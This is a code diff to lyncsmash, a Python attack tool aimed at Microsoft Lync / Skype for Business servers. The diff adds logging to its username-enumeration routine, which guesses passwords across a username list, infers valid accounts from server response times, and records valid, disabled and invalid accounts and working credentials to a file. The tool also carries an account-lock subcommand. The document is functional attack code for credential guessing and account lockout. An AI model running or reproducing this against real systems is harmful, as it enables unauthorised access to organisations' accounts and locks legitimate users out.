@@ -14,12 +14,14 @@ import os
 import string
 import random
 import requests
+import datetime
 
 try:
         requests.packages.urllib3.disable_warnings()
 except:
         pass
 
+outputfile="lyncsmash.log"
 validCred = False
 isDisabled = False
 timeout = 1.00
@@ -37,6 +39,7 @@ def main():
         enum_parser.add_argument('-d', dest='domain', help='Internal domain name', required=True)
         enum_parser.add_argument('-p', dest='passwd', help='Password to attempt', required=False)
         enum_parser.add_argument('-P', dest='passwdfile', help='Password file to read from', required=False)
+        enum_parser.add_argument('-o', dest='outfile', help='Output file', required=False)
 
         lock_parser = subparsers.add_parser('lock', help='Lock Lync user account')
         lock_parser.add_argument('-H', dest='host', help='Target IP address or host', required=True)
@@ -51,6 +54,7 @@ def main():
 
         # Enumerate valid Lync usernames
         elif args.attack == 'enum':
+                # check our arguments first
                 if ((args.passwd, args.passwdfile) == (None, None)):
                        print_error('You need to specify either a password or a password file to use')
                        exit()
@@ -58,14 +62,19 @@ def main():
                        print_error('You cant have both a passwd file and passwd specified')
                        exit()
 
+                if (( args.outfile ) == ( None )):
+                       print_error("You need to define an output file now. Entries will be appended to 'lyncsmash.log' instead.")
+                else:
+                       global outputfile
+                       outputfile = args.outfile
+
+                #okay, if we have a username file, proceed
                 if os.path.isfile(args.usernames):
-                        print_status('Getting timeout baseline')
+                        # get a baseline timeout - this is response time for invalid usernames
                         global timeout
                         timeout = baseline_timeout(args.host, args.domain)
                         if timeout:
                                 print_status("Average timeout is: {0}".format(timeout))
-
-
                                 if (args.passwd != None):
                                     timing_attack(args.host.rstrip(), args.usernames.rstrip(), args.passwd.rstrip(), args.domain.rstrip())
 
@@ -75,8 +84,6 @@ def main():
                                             timing_attack(args.host.rstrip(), args.usernames.rstrip(), password.rstrip(), args.domain.rstrip())
 
                                     pass_file.close()
-
-
 
                 else:
                         print_error('Could not find username file')
@@ -140,32 +147,47 @@ def discover_lync(host):
         return indicator_count, switch.get(indicator_count, 'Definitely')
 
 def timing_attack(host,userfilepath,password,domain):
-    with open(os.path.abspath(userfilepath)) as user_file:
-         for user in user_file:
-             response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
-             print_status("Testing Credentials {0}:{1}".format(user.rstrip(), password))
-             print_status("Time for {0}: {1}".format(user.rstrip(), response_time))
-             candidatevalue=float(float(response_time)/timeout)
-             if candidatevalue <= float("0.4"):
-                 if isDisabled:
-                     #print_disabled(user.rstrip())
-                     print_good("Valid User, Account Disabled: {0}".format(user))
-                 elif validCred:
-                     print_good("VALID CREDENTIALS: {0}:{1}".format(user.rstrip(), password.rstrip()))
+
+    global outputfile
+
+    with open((os.path.abspath(outputfile)),"a") as f:
+        currenttime=datetime.datetime.now()
+        f.write("Started lyncsmash at {0}\n".format(currenttime))
+        with open(os.path.abspath(userfilepath)) as user_file:
+             for user in user_file:
+                 response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
+                 candidatevalue=float(float(response_time)/timeout)
+                 if candidatevalue <= float("0.4"):
+                     if isDisabled:
+                         status="VALID USER, ACCOUNT DISABLED: {0}, Password: {1} Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
+                         print_good(status)
+                         f.write("[+] {0}\n".format(status))
+                     elif validCred:
+                         status="VALID CREDENTIALS: {0}, Password: {1}, Time: {2}".format(user.rstrip(), password.rstrip(),response_time)
+                         print_good(status)
+                         f.write("[!] {0}\n".format(status))
+                     else:
+                         status="VALID USER: {0}, INVALID PASSWORD: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
+                         print_good(status)
+                         f.write("[+] {}\n".format(status))
                  else:
-                     print_good("Valid User, Invalid Password: {0}".format(user))
-             #print ''
-    user_file.close()
+                         status="INVALID USER: {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
+                         print_error(status)
+                         f.write("[-] {0}\n".format(status))
+                 #print ''
+        user_file.close()
 
 
 # Determine the baseline timeout for invalid username
 def baseline_timeout(host, domain):
+	print_status("Performing baseline tests ... this will take a while")
         response_times = []
         for loop in range(0, 3):
                 try:
                         random_user = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
                         response_time = send_xml(host, domain, random_user, "n0t_y0ur_p4ss")
                         if response_time:
+                                print_status("Response time for test #{0} is {1}".format((loop+1),response_time))
                                 response_times.append(float(response_time))
                         else:
                                 break
@@ -206,7 +228,8 @@ def send_xml(host, domain, user, passwd):
                     #print_disabled(domain_user.rstrip())
                 else:
                     isDisabled = False
-                    print_status(webholder.text)
+                    # this will eventually be switchable with verbose or debug flag
+                    #print_status(webholder.text)
                     validCred = True
                 response_time = str(webholder.elapsed.total_seconds())
                 status_code = webholder.status_code
@@ -228,7 +251,7 @@ def send_xml(host, domain, user, passwd):
         return response_time
 
 def print_success(username,password):
-        print("\033[1m\033[32m[+]\033[0m RETURNED STATUS 200: POSSIBLE USER {0} with PASS {1}".format(username,password))
+        print("\033[1m\033[32m[+]\033[0m RETURNED STATUS 200: VALID USER {0} with PASS {1}".format(username,password))
 
 def print_error(msg):
         print("\033[1m\033[31m[-]\033[0m {0}".format(msg))
@@ -248,3 +271,4 @@ def print_warn(msg):
 
 if __name__ == '__main__':
         main()
+	
